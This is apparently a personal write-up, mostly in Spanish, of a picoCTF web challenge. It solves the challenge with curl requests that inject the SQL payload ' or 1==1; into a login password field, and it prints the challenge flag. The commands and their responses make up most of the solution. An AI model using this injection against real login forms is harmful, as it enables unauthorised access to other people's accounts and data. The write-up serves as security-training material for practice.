## descripcion
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## pistas
There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

Try to think about how the website verifies your login.

![[Pasted image 20240305174811.png]]
## Solution

```
VFlours@win MINGW64 /d/Downloads/notas-hacking (main)
$ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=password&debug=1"
<pre>username: admin
password: password
SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
</pre><h1>Login failed.</h1>
VFlours@win MINGW64 /d/Downloads/notas-hacking (main)
$ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=' or 1==1;&debug=1"
<pre>username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>
VFlours@win MINGW64 /d/Downloads/notas-hacking (main)





```

utilizando la injeccion sql mostrada haya arriba se puede ingresar poniendola en el password. de forma web
# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
## notas

Comandos utilizados:
	1. `-s`: Es una opción que indica a `curl` que funcione en modo silencioso, lo que significa que no mostrará la barra de progreso ni mensajes de estado. Es útil cuando solo queremos los resultados de la solicitud HTTP.
	2. Esta opción `-d` envía datos POST al servidor. Aquí, se están enviando tres parámetros: `username` con valor `admin`, `password` con valor `password`, y `debug` con valor `1`. Estos son los datos que se enviarán al servidor como parte de la solicitud HTTP POST.


injeccion sql es un tipo de tecnica que puede destruir mi base de datos.

Cuando esta el debug en 1 sugiere que el formulario está diseñado para manejar diferentes escenarios dependiendo de si se está realizando una operación de depuración o no. Es importante tener en cuenta cómo se utiliza este parámetro en el backend para comprender completamente su efecto en la aplicación.




## references
